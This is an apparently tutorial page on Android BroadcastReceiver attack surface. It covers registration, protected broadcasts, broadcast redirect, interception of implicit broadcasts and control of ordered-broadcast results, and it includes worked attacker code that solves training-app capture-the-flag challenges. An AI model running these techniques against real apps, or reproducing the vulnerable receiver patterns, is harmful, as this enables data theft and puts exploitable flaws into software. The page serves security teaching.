---
title: "Broadcast Receivers"
---

> **Note**: this section requires a full understanding of [Intent attack surface](intent attack surface.html).

## Introduction

A **[Broadcast Receiver](https://developer.android.com/develop/background-work/background-tasks/broadcasts)** is a core component that allows your app to listen for system-wide broadcast announcements (called broadcast intents) or broadcasts sent by other applications or even your own application.

Apps can register to receive specific broadcasts. When a broadcast is sent, the system automatically routes broadcasts to apps that have subscribed to receive that particular type of broadcast.

Basically, broadcasts can be used as a messaging system across apps and outside of the normal user flow.

Broadcast Receivers don’t display a user interface. Instead, they respond to broadcasted events by performing some logic. For example: starting a service, showing a notification, logging data, etc.

### Declaring a broadcast receiver

You can register a receiver in **two ways**:

1. **Static Registration** (Manifest)

* The receiver is declared in the `AndroidManifest.xml` file using the `<receiver>` tag.
* It can receive broadcasts even when your app is not running (e.g., listening for `ACTION_BOOT_COMPLETED`).

```xml
<receiver android:name=".MyBootReceiver" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>
```

The class `MyBootReceiver` extends `BroadcastReceiver` and it overrides the `onReceive (Context context, Intent intent)` method.

From the attacker perspective this is interesting because the incoming intent is potentially controlled by an attacker.

2. **Dynamic Registration** (Runtime)

Registered at runtime by using `registerReceiver()` and this works only while the app is running.

```java
val receiver = MyReceiver()
val filter = IntentFilter(Intent.ACTION_BATTERY_LOW)
registerReceiver(receiver, filter)
```

In this case, if the system sends this broadcast intent, then the class `receiver` is used as the receiver and it'll execute the code in the `onReceive()` method.

> **Note**: Dynamically registered receivers used to be **exported by default**: any app could send them an unprotected broadcast, unless they were guarded by a signature permission. Android 13 (API 33) introduced the `Context.RECEIVER_EXPORTED` and `Context.RECEIVER_NOT_EXPORTED` flags, and apps targeting Android 14 (API 34) or higher must pass one of them, otherwise `registerReceiver()` throws a `SecurityException`. The only exception is a receiver registered exclusively for system broadcasts \[[↗](https://developer.android.com/about/versions/14/behavior-changes-14)].

### Send broadcasts

Android provides two ways for apps to send broadcasts \[[↗](https://developer.android.com/develop/background-work/background-tasks/broadcasts#sending-broadcasts)]:

* The `sendOrderedBroadcast()` method sends broadcasts to one receiver at a time. As each receiver executes in turn, **it can propagate a result to the next receiver**. It can also completely abort the broadcast so that it doesn't reach other receivers. You can control the order in which receivers run within the same app process. To do so, use the `android:priority` attribute of the matching `intent-filter`. Receivers with the same priority are run in an arbitrary order. Since Android 16, priority is only respected within the same process: across different apps the order is no longer guaranteed \[[↗](https://developer.android.com/about/versions/16/behavior-changes-all#ordered-broadcast-priority)].
* The `sendBroadcast()` method sends broadcasts to all receivers in an undefined order. This is called a Normal Broadcast. This is more efficient, but means that **receivers cannot read results** from other receivers, propagate data received from the broadcast, or abort the broadcast.

### Broadcast limitations

From Android 8 (API level 26), apps can no longer receive implicit broadcasts through receivers declared in their **manifest** \[[↗](https://developer.android.com/about/versions/oreo/background#broadcasts)]. The system wants to avoid waking up apps that are not even running. So, to reach a manifest-declared receiver, you **have to specify the target** (explicit broadcast).

* This applies to apps targeting API 26 or higher.
* **Dynamically registered receivers are not affected**: they still receive implicit broadcasts while the app is running.
* Some broadcasts are [exempt](https://developer.android.com/develop/background-work/background-tasks/broadcasts/broadcast-exceptions), as are broadcasts that require a signature permission.

### System event broadcasts

Android defines many system broadcast actions, such as `BOOT_COMPLETED` and `ACTION_POWER_CONNECTED`, declared as `<protected-broadcast>` in the [framework manifest](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/res/AndroidManifest.xml). Attempting to send a protected broadcast from a non-system app fails with a `SecurityException`, for example: `Permission Denial: not allowed to send broadcast android.intent.action.ACTION_POWER_CONNECTED from pid=..., uid=...`. This restriction applies to both implicit and explicit intents. Even when the target app and receiver class are specified explicitly, the system blocks the broadcast because only the system is allowed to send these actions. As a result, protected broadcast actions cannot be spoofed.

However, this does not automatically make the receiver safe. Since an attacker cannot set the protected action value, the receiver’s code cannot enter branches that explicitly check for it. If the receiver contains alternative code paths that do not validate the action, those paths may still be reachable through an explicit broadcast with a custom action.

Malicious app:

```java
Intent intent = new Intent();
intent.setAction("test");
intent.setClassName("com.app.test", "com.app.test.TestReceiver");
sendBroadcast(intent);
```

Target app:

```xml
<receiver android:name="com.app.test.TestReceiver" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
    </intent-filter>
</receiver>
```

```java
public void onReceive(Context context, Intent intent) {
    String action = intent.getAction();
    if ("android.intent.action.ACTION_POWER_CONNECTED".equals(action)) {
        ...
    } else {
        // We can execute this code!
    }
}
```

In the example above, the if branch is protected because the system action cannot be forged. The else branch, however, is reachable if an explicit intent with a different action is sent, allowing unintended behavior to be triggered.

The key takeaway is that while protected system broadcasts themselves cannot be forged, BroadcastReceivers that do not strictly validate incoming intents may still expose an attack surface.

---

## Sending broadcast from malicious app

Let's say that the app `io.hextree.attacksurface` has the following `BroadcastReceiver`:

```xml
<receiver
    android:name="io.hextree.attacksurface.receivers.Flag16Receiver"
    android:enabled="true"
    android:exported="true"/>
```

```java
public class Flag16Receiver extends BroadcastReceiver {
    public static String FlagSecret = "give-flag-16";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("Flag16Receiver.onReceive", Utils.dumpIntent(context, intent));
        if (intent.getStringExtra("flag").equals(FlagSecret)) {
            success(context, FlagSecret);
        }
    }

    private void success(Context context, String str) {...}
}
```

You can just send a broadcast as follow:

```java
Intent intent = new Intent();
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver");
intent.putExtra("flag", "give-flag-16");
sendBroadcast(intent);
```

---

## Vulnerabilities

### Broadcast redirect

A broadcast redirect occurs when an insecure activity takes an incoming intent, performs some actions/modifications, and then sends the intent via `sendBroadcast()`. This allows an attacker to control the broadcast intent. For example, this could target internal, non-exported broadcast receivers.

```java
public class ExposedActivity extends AppCompatActivity {

    @Override
    protected void onCreate (...) {
        ...
        Intent intent = getIntent();
        intent.setClassName("com.example.myapp", "com.example.myapp.InternalReceiver");
        sendBroadcast(intent); // This intent could be controlled by the attacker
    }
}

```

For more information, refer to [Intent attack surface - Intent redirect](intent%20attack%20surface.html#intent-redirect).

### Intercept implicit intents

This is when an app sends an implicit broadcast, so a malicious app can register a receiver to be a valid target for it.

1. Identify an app that sends an implicit broadcast.
2. Register a receiver dynamically in your activity. This means your app must be already running.

```java
BroadcastReceiver receiver = new HijackReceiver();
// RECEIVER_EXPORTED: required on Android 14+ to receive broadcasts from other apps
registerReceiver(receiver, new IntentFilter("com.example.app.intent.SP_APPS_QUERY_FEEDS"), Context.RECEIVER_EXPORTED);
```

> **Note**: a receiver declared in your `AndroidManifest.xml` will not receive the implicit broadcast, because of the [Android 8 limitation](#broadcast-limitations) described above.

**Example**

Let’s say that the app io.hextree.attacksurface has the following activity:

```java
public class Flag18Activity extends AppCompactActivity {
    public Flag18Activity() {...}

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Intent intent = new Intent("io.hextree.broadcast.FREE_FLAG");
        intent.putExtra("flag", this.f182f.appendLog(this.flag));
        intent.addFlags(8);
        sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent2) {
                String resultData = getResultData();
                Bundle resultExtras = getResultExtras(false);
                int resultCode = getResultCode();
                Log.i("Flag18Activity.BroadcastReceiver", "resultData " + resultData);
                Log.i("Flag18Activity.BroadcastReceiver", "resultExtras " + resultExtras);
                Log.i("Flag18Activity.BroadcastReceiver", "resultCode " + resultCode);
                if (resultCode != 0) {
                    flag18Activity.success(flag18Activity);
                }
            }
        }, null, 0, null, null);
    }
}
```

To intercept this intent I have to register a receiver and send `resultCode != 0`:

```java
BroadcastReceiver hijackReceiver = new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
        String flag = intent.getStringExtra("flag");
        if (flag != null) {
            Log.d("flag", flag);
        }
        setResultCode(RESULT_OK); // Costant value for -1. We add this to trigger success()
    }
};
registerReceiver(hijackReceiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"), Context.RECEIVER_EXPORTED);
```

### Control the results

Similar to activities, a broadcast can return results back to the sender with `sendOrderedBroadcast()`. This method takes another BroadcastReceiver (the *result receiver*), which is called at the end with the final result (`resultCode`, `resultData`, `resultExtras`).

```java
BroadcastReceiver resultReceiver = new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
        String resultData = getResultData();
        Bundle resultExtras = getResultExtras(false);
        int resultCode = getResultCode();
    }
};

sendOrderedBroadcast(intent, null, resultReceiver, null, RESULT_CANCELED, null, null);
```

This works in both directions:

* **The victim sends** the ordered broadcast: a malicious receiver can set attacker-controlled results with `setResultCode()`, `setResultData()` and `setResultExtras()`, which the victim then trusts (see [Intercept implicit intents](#intercept-implicit-intents)).
* **The attacker sends** the ordered broadcast to the victim's receiver: the victim's results come back to the attacker's result receiver, possibly leaking data (example below).

**Example**

Let’s say that the app io.hextree.attacksurface has the following BroadcastReceiver:

```xml
<receiver
    android:name="io.hextree.attacksurface.receivers.Flag17Receiver"
    android:enabled="true"
    android:exported="true"/>
```

```java
public class Flag17Receiver extends BroadcastReceiver {
    public static String FlagSecret = "give-flag-17";

    @Override 
    public void onReceive(Context context, Intent intent) {
        Log.i("Flag17Receiver.onReceive", Utils.dumpIntent(context, intent));
        if (isOrderedBroadcast()) {
            if (intent.getStringExtra("flag").equals(FlagSecret)) {
                success(context, FlagSecret);
                return;
            }
            Bundle bundle = new Bundle();
            bundle.putBoolean("success", false);
            setResult(0, "Flag 17 Completed", bundle);
        }
    }

    private void success(Context context, String str) {
        Flag17Activity flag17Activity = new Flag17Activity();
        flag17Activity.f182f = new LogHelper(context);
        flag17Activity.f182f.addTag(str);
        flag17Activity.success(null, context);
        Bundle bundle = new Bundle();
        bundle.putBoolean("success", true);
        bundle.putString("flag", flag17Activity.f182f.appendLog(flag17Activity.flag));
        setResult(-1, "Flag 17 Completed", bundle);
    }
}
```

To get the flag, send an ordered broadcast to the receiver and read the results:

```java
Intent intent = new Intent();
intent.putExtra("flag", "give-flag-17");
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver");
sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle result = getResultExtras(true);
        if (result != null && result.getBoolean("success")) {
            Log.d("Flag: ",result.getString("flag"));
        }

    }}
    , null, 0, null, null);
```